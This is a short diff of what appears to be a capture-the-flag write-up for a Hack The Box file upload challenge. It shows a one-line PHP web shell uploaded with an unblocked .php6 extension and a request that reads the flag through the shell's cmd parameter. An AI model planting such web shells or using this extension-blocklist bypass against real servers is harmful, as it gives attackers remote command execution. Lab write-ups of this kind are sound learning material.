@@ -6,6 +6,6 @@
 - I noticed that the .php6 extension is not blocked by the web application, so I use that one with the final payload, file name is "hellp.php6"
 > <?php system($_REQUEST['cmd']); ?><?php ?>
 - File successfully uploaded
-- http://IP:PORT/profile_images/hellp.php6?cmd=cat%20/flag.txt
+- //IP:PORT/profile_images/hellp.php6?cmd=cat%20/flag.txt
 - and got a flag ;)
 - HTB{1_CENSORED_bl4ckl1573d}
